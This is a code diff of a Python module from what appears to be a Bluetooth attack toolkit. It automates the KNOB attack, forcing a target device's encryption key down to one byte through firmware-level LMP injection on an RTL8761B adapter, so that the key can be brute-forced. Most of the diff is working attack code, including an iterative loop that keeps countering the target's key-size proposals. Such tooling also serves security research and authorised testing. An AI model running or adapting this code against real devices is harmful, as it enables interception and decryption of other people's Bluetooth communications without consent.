@@ -9,7 +9,7 @@ brute-forced in real time.
 Attack principle:
   1. Probe target to determine BT version and KNOB susceptibility
   2. Negotiate minimum encryption key size (1 byte) via:
-     a) InternalBlue LMP-level key size manipulation (requires Broadcom/Cypress)
+     a) DarkFirmware LMP-level key size manipulation on RTL8761B
      b) Fallback: btmgmt to set local adapter min key size before pairing
   3. Brute-force the resulting encryption key (256 candidates for 1-byte key)
 
@@ -20,7 +20,7 @@ Affected versions:
 
 Prerequisites:
   - For full attack: baseband MitM via USRP/HackRF + gr-bluetooth, or
-    InternalBlue with Broadcom/Cypress chipset for LMP manipulation
+    DarkFirmware on RTL8761B for LMP manipulation
   - For demonstration: btmgmt access to set local adapter min key size
 
 Limitations:
@@ -55,7 +55,7 @@ class KNOBAttack:
     """KNOB attack orchestration: probe, negotiate min key, brute-force.
 
     Supports two approaches:
-      1. InternalBlue LMP injection (full attack, requires Broadcom/Cypress)
+      1. DarkFirmware LMP injection on RTL8761B (full attack, below-HCI)
       2. btmgmt local key size setting (demonstration, software-only)
     """
 
@@ -63,21 +63,20 @@ class KNOBAttack:
         self.target = normalize_mac(target)
         self.hci = hci
         self._results: dict = {}
-        self._internalblue_available: bool | None = None
+        self._darkfirmware_available: bool | None = None
 
-    def _check_internalblue(self) -> bool:
-        """Check if InternalBlue is importable."""
-        if self._internalblue_available is not None:
-            return self._internalblue_available
+    def _check_darkfirmware(self) -> bool:
+        """Check if DarkFirmware is available for LMP-level key size manipulation."""
+        if self._darkfirmware_available is not None:
+            return self._darkfirmware_available
 
-        result = run_cmd(
-            ["python3", "-c", "import internalblue; print('OK')"],
-            timeout=10,
-        )
-        self._internalblue_available = (
-            result.returncode == 0 and "OK" in result.stdout
-        )
-        return self._internalblue_available
+        try:
+            from blue_tap.core.firmware import DarkFirmwareManager
+            fw = DarkFirmwareManager()
+            self._darkfirmware_available = fw.is_darkfirmware_loaded(self.hci)
+        except Exception:
+            self._darkfirmware_available = False
+        return self._darkfirmware_available
 
     def _get_bt_version(self) -> tuple[float | None, str | None]:
         """Query target BT version via hcitool info.
@@ -229,21 +228,21 @@ class KNOBAttack:
             )
             info("No active connection to target; key size check skipped")
 
-        # Step 3: Check InternalBlue availability
-        ib_available = self._check_internalblue()
-        result["internalblue_available"] = ib_available
-        result["method"] = "internalblue" if ib_available else "btmgmt"
-        if ib_available:
+        # Step 3: Check DarkFirmware availability
+        df_available = self._check_darkfirmware()
+        result["darkfirmware_available"] = df_available
+        result["method"] = "darkfirmware" if df_available else "btmgmt"
+        if df_available:
             result["details"].append(
-                "InternalBlue available — full LMP-level KNOB attack possible"
+                "DarkFirmware available — full LMP-level KNOB attack possible"
             )
-            info("InternalBlue detected: LMP-level key size manipulation available")
+            info("DarkFirmware detected: LMP-level key size manipulation available")
         else:
             result["details"].append(
-                "InternalBlue not available — will use btmgmt fallback "
+                "DarkFirmware not available — will use btmgmt fallback "
                 "for local key size setting"
             )
-            info("InternalBlue not found; btmgmt fallback will be used")
+            info("DarkFirmware not found; btmgmt fallback will be used")
 
         self._results["probe"] = result
         return result
@@ -252,7 +251,7 @@ class KNOBAttack:
         """Attempt to negotiate minimum encryption key size.
 
         Strategy:
-          1. If InternalBlue available: manipulate LMP key size at firmware level
+          1. If DarkFirmware available: manipulate LMP key size at firmware level
           2. Fallback: use btmgmt to set local adapter min key size to 1 before
              pairing, then connect via L2CAP and observe negotiated key size
 
@@ -268,12 +267,12 @@ class KNOBAttack:
             "details": [],
         }
 
-        ib_available = self._check_internalblue()
+        df_available = self._check_darkfirmware()
 
-        if ib_available:
-            result["method"] = "internalblue_lmp"
-            info("Using InternalBlue for LMP-level key size manipulation")
-            self._negotiate_via_internalblue(result)
+        if df_available:
+            result["method"] = "darkfirmware_lmp"
+            info("Using DarkFirmware for LMP-level key size manipulation")
+            self._negotiate_via_darkfirmware(result)
         else:
             result["method"] = "btmgmt_fallback"
             info("Using btmgmt to set local adapter minimum key size")
@@ -286,43 +285,118 @@ class KNOBAttack:
         self._results["negotiate"] = result
         return result
 
-    def _negotiate_via_internalblue(self, result: dict) -> None:
-        """Negotiate min key size via InternalBlue LMP injection.
+    def _negotiate_via_darkfirmware(self, result: dict, max_rounds: int = 10) -> None:
+        """Negotiate minimum encryption key size via DarkFirmware LMP injection.
 
-        InternalBlue patches Broadcom/Cypress firmware to intercept and
-        modify LMP_encryption_key_size_req PDUs, forcing key_size=1.
+        Sends LMP_encryption_key_size_req with key_size=1 directly at the LMP
+        layer, bypassing HCI-level restrictions. Iteratively counters the
+        target's proposed key size until agreement or max_rounds is reached.
+
+        Args:
+            result: Mutable result dict to populate with negotiation details.
+            max_rounds: Maximum number of negotiation rounds (default 10).
         """
-        info("InternalBlue LMP key size negotiation:")
-        info("  1. Patching firmware to intercept LMP_encryption_key_size_req")
-        info("  2. Rewriting key_size field to 1 byte")
-        info("  3. Both sides will agree on 1-byte key")
-        info("")
-        info("This requires manual InternalBlue session:")
-        info("  python3 -m internalblue")
-        info("  > sendlmp <handle> 10 01  # LMP_encryption_key_size_req, size=1")
-        info("")
-        info("Reference: https://github.com/francozappa/knob")
-
-        result["details"].append(
-            "InternalBlue available but requires interactive firmware patching. "
-            "See knobattack.com for chipset-specific patches."
+        from blue_tap.core.hci_vsc import HCIVSCSocket
+        from blue_tap.fuzz.protocols.lmp import (
+            build_enc_key_size_req, knob_template,
+            LMP_ENCRYPTION_KEY_SIZE_REQ,
         )
 
-        # Attempt automated InternalBlue connection as best-effort
-        ib_check = run_cmd(
-            ["python3", "-c",
-             "from internalblue.core import InternalBlue; "
-             "ib = InternalBlue(); print('init_ok')"],
-            timeout=15,
-        )
-        if "init_ok" in ib_check.stdout:
-            info("InternalBlue core initialized — chipset access confirmed")
-            result["details"].append("InternalBlue core initialized successfully")
-        else:
-            warning("InternalBlue core init failed — chipset may not be compatible")
-            result["details"].append(
-                f"InternalBlue init failed: {ib_check.stderr.strip()}"
-            )
+        hci_idx = int(self.hci.replace("hci", "")) if self.hci.startswith("hci") else 1
+
+        try:
+            with HCIVSCSocket(hci_idx) as vsc:
+                lmp_responses: list[dict] = []
+                vsc.start_lmp_monitor(lambda evt: lmp_responses.append(evt))
+
+                # Initial KNOB: key_size = 1 byte
+                info("[KNOB] Step 1: Sending LMP_encryption_key_size_req(key_size=1) via DarkFirmware")
+                payload = knob_template()
+                ok = vsc.send_lmp(payload)
+
+                if ok:
+                    result["details"].append("Sent LMP_encryption_key_size_req(key_size=1) via DarkFirmware")
+                else:
+                    result["details"].append("Failed to send LMP via DarkFirmware")
+                    return
+
+                # Iterative negotiation: parse responses and counter-propose
+                final_key_size = None
+                for round_num in range(1, max_rounds + 1):
+                    time.sleep(1)
+
+                    # Check for LMP_ENCRYPTION_KEY_SIZE_REQ (opcode 16) responses
+                    new_responses = list(lmp_responses)
+                    lmp_responses.clear()
+
+                    target_proposed = None
+                    for evt in new_responses:
+                        opcode = evt.get("opcode")
+                        if opcode is not None:
+                            info(f"[KNOB] Received LMP response: opcode={opcode:#04x}")
+
+                        # Check if this is an LMP key size response
+                        # DarkFirmware LMP logs have opcode in the parsed dict
+                        payload_bytes = evt.get("payload", b"")
+                        if payload_bytes and len(payload_bytes) >= 2:
+                            pdu_opcode = payload_bytes[0] & 0x7F
+                            if pdu_opcode == LMP_ENCRYPTION_KEY_SIZE_REQ:
+                                target_proposed = payload_bytes[1]
+                                info(f"[KNOB] Round {round_num}: target proposed key_size={target_proposed}, "
+                                     f"countering with 1")
+                                result["details"].append(
+                                    f"Round {round_num}: target proposed key_size={target_proposed}"
+                                )
+
+                    if target_proposed is not None:
+                        if target_proposed <= 1:
+                            # Target accepted key_size=1
+                            final_key_size = target_proposed
+                            info(f"[KNOB] Round {round_num}: target accepted key_size={target_proposed}")
+                            result["negotiated_key_size"] = target_proposed
+                            result["success"] = True
+                            success(f"[KNOB] Key size negotiated to {target_proposed} byte(s)")
+                            break
+                        else:
+                            # Target proposed larger — counter with 1 again
+                            counter_pkt = build_enc_key_size_req(key_size=1)
+                            vsc.send_lmp(counter_pkt)
+                            result["details"].append(
+                                f"Round {round_num}: countered with key_size=1"
+                            )
+                    else:
+                        # No key size response in this round
+                        if not new_responses:
+                            info(f"[KNOB] Round {round_num}: no LMP response (waiting...)")
+                        break
+
+                if final_key_size is None:
+                    # Check overall responses
+                    time.sleep(1)
+                    vsc.stop_lmp_monitor()
+                    all_responses = list(vsc.lmp_log_buffer)
+                    result["lmp_responses"] = len(all_responses)
+                    for evt in all_responses:
+                        opcode = evt.get("opcode")
+                        result["details"].append(
+                            f"LMP response: opcode={opcode:#04x}" if opcode else str(evt)
+                        )
+
+                    if all_responses:
+                        result["darkfirmware_negotiation"] = "completed"
+                        result["details"].append(
+                            f"Negotiation completed after {max_rounds} rounds "
+                            f"without confirmed key_size=1"
+                        )
+                    else:
+                        result["darkfirmware_negotiation"] = "no_lmp_response"
+                else:
+                    vsc.stop_lmp_monitor()
+                    result["darkfirmware_negotiation"] = "success"
+                    result["lmp_responses"] = len(list(vsc.lmp_log_buffer))
+
+        except Exception as exc:
+            result["details"].append(f"DarkFirmware negotiation error: {exc}")
 
     def _negotiate_via_btmgmt(self, result: dict) -> None:
         """Negotiate min key size via btmgmt (software-only fallback).
@@ -362,7 +436,7 @@ class KNOBAttack:
                 )
                 result["details"].append(
                     "btmgmt min-enc-key-size not supported on this adapter/kernel. "
-                    "Full KNOB requires InternalBlue or USRP baseband MitM."
+                    "Full KNOB requires DarkFirmware or USRP baseband MitM."
                 )
 
         # Step 2: Connect via L2CAP to trigger encryption negotiation
